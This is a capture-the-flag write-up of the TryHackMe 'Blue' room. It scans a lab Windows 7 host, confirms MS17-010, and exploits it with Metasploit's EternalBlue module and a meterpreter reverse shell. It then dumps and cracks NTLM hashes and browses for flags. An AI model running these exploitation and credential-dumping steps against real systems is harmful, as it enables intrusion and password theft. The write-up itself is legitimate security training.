---
author: "fireblood"
date: 2023-05-23
linktitle: Blue
menu:
  main:
    parent: tryhackme

title: Blue
weight: 2
---

> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

https://tryhackme.com/r/room/blue

<!--more-->

# Scanning

Scan the machine for open ports and vulnerabilities using nmap.

```python
❯ rustscan -a 10.10.162.1 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.162.1:135
Open 10.10.162.1:139
Open 10.10.162.1:445
Open 10.10.162.1:3389
Open 10.10.162.1:49152
Open 10.10.162.1:49154
Open 10.10.162.1:49153
Open 10.10.162.1:49159
Open 10.10.162.1:49158
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC" on ip 10.10.162.1
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 18:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:21
Completed NSE at 18:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:21
Completed NSE at 18:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:21
Completed NSE at 18:21, 0.00s elapsed
Initiating Ping Scan at 18:21
Scanning 10.10.162.1 [4 ports]
Completed Ping Scan at 18:21, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:21
Completed Parallel DNS resolution of 1 host. at 18:21, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:21
Scanning 10.10.162.1 [9 ports]
Discovered open port 135/tcp on 10.10.162.1
Discovered open port 445/tcp on 10.10.162.1
Discovered open port 139/tcp on 10.10.162.1
Discovered open port 3389/tcp on 10.10.162.1
Discovered open port 49159/tcp on 10.10.162.1
Discovered open port 49152/tcp on 10.10.162.1
Discovered open port 49158/tcp on 10.10.162.1
Discovered open port 49153/tcp on 10.10.162.1
Discovered open port 49154/tcp on 10.10.162.1
Completed SYN Stealth Scan at 18:21, 0.16s elapsed (9 total ports)
Initiating Service scan at 18:21
Scanning 9 services on 10.10.162.1
Service scan Timing: About 44.44% done; ETC: 18:23 (0:01:09 remaining)
Completed Service scan at 18:22, 86.37s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.162.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 5.82s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.42s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Nmap scan report for 10.10.162.1
Host is up, received echo-reply ttl 125 (0.12s latency).
Scanned at 2024-05-24 18:21:03 EDT for 92s

PORT      STATE SERVICE        REASON          VERSION
135/tcp   open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server? syn-ack ttl 125
|_ssl-date: 2024-05-24T22:22:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-05-23T22:14:32
| Not valid after:  2024-11-22T22:14:32
| MD5:   629ad470ab4e21a9c813d65ab304115f
| SHA-1: 993099d4405a6dfab9f6c525bd1ae3e3303c8d9c
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQfNA0SBpvGoJLfiNM2PSHGDANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZKb24tUEMwHhcNMjQwNTIzMjIxNDMyWhcNMjQxMTIyMjIxNDMy
| WjARMQ8wDQYDVQQDEwZKb24tUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDsV5bZ4x4asKFHMR0OI3UTMugwb/0dVzp6WfkpNtFtW0Yjktq1uyqTrbHh
| jeTCeLQgYs9CU7MQazj4K6ffIv2Ve0pFKlTKXsgWbGEDzTqUKnOWioP5rrClo5b9
| BX6SIEVgiKzr0EUZss94gezW8RWMVmOcSlMkPwBlvxUmHkfRhOCf9XptEejTMxpV
| fDC8hvAOl2YQmBLiNwrYHvDT32xUwzFyC9T6IXSD8no3sg7eaJHbCWBgNU+8rTq5
| h+8tSuJTtTa7w0axS5+T6jRr0P3NjPLGbC0jh7ZG8/+myqZwvIV9g8DB/JjBoOD2
| XAYPCqADeX9t7gWUrYPyu+99srP7AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAIXknfD0u0S0InIoL
| EnHxSkF6nkU0xYluo0yIT0J85WAh2XJZhbN51h8wI5zgFbyDhNQITLX0tMwc3p2m
| 2nCfM21t5o8VIgJOsM17x4uOqgVpm/egezHoUJEWoexVU4acLf/zZ0eUC6UAXmQk
| ouW1jXiG21NWOmwpyAjN7Ixjm9NMGaPok7Y96d4u80wU9etLhDO4h1HLSd3DJEaL
| YEpnweXMNg0IuaxJu9V2zykUQUal14bvv0LZNzkZsBD0dFuwJ1ReKVH+39dYUCgU
| K8Z2Z2jBo0RcFH0uPBBJ112QTlaC69R2giMQuwERB3rFqmhC7W4k1alP9qfhWSAH
| yqNL5g==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-05-24T22:22:29+00:00
49152/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-24T17:22:29-05:00
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02291b084223 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02291b0842230000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-24T22:22:29
|_  start_date: 2024-05-24T22:14:25
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22780/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41456/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34046/udp): CLEAN (Timeout)
|   Check 4 (port 27211/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.39 seconds
           Raw packets sent: 13 (548B) | Rcvd: 10 (424B)
```
Running it again to check for vulnerabilities yields the following result.

```python
Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```

From the scan results we can see that the machine is vulnerable to `ms17-010`.

# Exploitation

Let's open metasploit.

```python
msfconsole -q
```

Search for the exploit ms17-010 and use exploit/windows/smb/ms17_010_eternalblue.

```python
search ms17-010
```

```python
use 0
```

```python
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The payload is set by default to windows/x64/meterpreter/reverse tcp.

See the available options and change the rport and lhost.

```shell
show options
```

```shell
set rhosts 10.10.162.1
```

```shell
set lhost tun0
```

<img src="{{'/assets/img/images/02.Blue/04.png' | prepend: site.baseurl }}">

Run the exploit.

```shell
exploit
```

```python
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.6.10.164:4444 
[*] 10.10.162.1:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.162.1:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.162.1:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.162.1:445 - The target is vulnerable.
[*] 10.10.162.1:445 - Connecting to target for exploitation.
[+] 10.10.162.1:445 - Connection established for exploitation.
[+] 10.10.162.1:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.162.1:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.162.1:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.162.1:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.162.1:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.162.1:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.162.1:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.162.1:445 - Sending all but last fragment of exploit packet
[*] 10.10.162.1:445 - Starting non-paged pool grooming
[+] 10.10.162.1:445 - Sending SMBv2 buffers
[+] 10.10.162.1:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.162.1:445 - Sending final SMBv2 buffers.
[*] 10.10.162.1:445 - Sending last fragment of exploit packet!
[*] 10.10.162.1:445 - Receiving response from exploit packet
[+] 10.10.162.1:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.162.1:445 - Sending egg to corrupted connection.
[*] 10.10.162.1:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.162.1
[*] Meterpreter session 1 opened (10.6.10.164:4444 -> 10.10.162.1:49213) at 2024-05-24 18:46:11 -0400
[+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

We now got a meterpreter shell. Let's quickly find out the information about the machine.

```python
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

We are logged in as nt authority\system. Now we have all privileges to the machine.

We can run hashdump in the meterpreter shell to get the hashes.

```python
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Now we will crack the hash of user Jon with John The Ripper.

```shell
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

```python
❯ cat hash.txt
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
❯ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2024-05-24 18:52) 1.098g/s 11209Kp/s 11209Kc/s 11209KC/s alshaneebalshaneeb..alphaneons
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
root@kali ~/tryhackme ❯
```

Now let's find the flags. The first flag is located in the location C:\ .

```python
meterpreter > dir C:/
Listing: C:/
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:36 -0500  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 18:22:01 -0400  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 18:28:38 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 18:35:57 -0400  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:22 -0500  Recovery
040777/rwxrwxrwx  4096   dir   2024-05-24 18:50:58 -0400  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-12 22:13:28 -0500  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 18:36:30 -0400  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 15:27:21 -0400  flag1.txt
000000/---------  0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter >
```

The second flag is located at the location where passwords are stored. The passwords are stored in SAM file. So, the second flag would be in the location C: \windows\system32\config.

```python
meterpreter > dir C:/windows\/system32/config
Listing: C:/windows/system32/config
===================================

100666/rw-rw-rw-  12582912  fil   2024-05-24 18:52:09 -0400  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:06 -0400  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2024-05-24 18:52:09 -0400  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-12 18:03:05 -0500  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 15:32:48 -0400  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-20 21:41:37 -0500  systemprofile

meterpreter >
```

The third flag is located in the Documents folder of the user Jon.

```python
meterpreter > dir C:/Users/Jon/Documents
Listing: C:/Users/Jon/Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Music
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Videos
100666/rw-rw-rw-  402   fil   2018-12-12 22:13:48 -0500  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 15:26:36 -0400  flag3.txt

meterpreter >
```